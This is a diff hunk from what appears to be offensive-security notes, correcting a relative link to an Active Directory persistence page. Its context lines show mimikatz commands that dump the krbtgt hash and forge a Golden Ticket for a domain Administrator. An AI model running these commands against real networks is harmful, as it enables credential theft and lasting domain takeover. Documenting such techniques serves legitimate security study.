@@ -67,7 +67,7 @@ mimikatz # lsadump::lsa /patch         # dump krbtgt hash
 mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<sid> /krbtgt:<hash> /ptt
 ```
 
-See [Active Directory Persistence](privilege-escalation/active-directory/persistence.md) for Golden Ticket and Shadow Copy techniques.
+See [Active Directory Persistence](../privilege-escalation/active-directory/persistence.md) for Golden Ticket and Shadow Copy techniques.
 
 ---
 
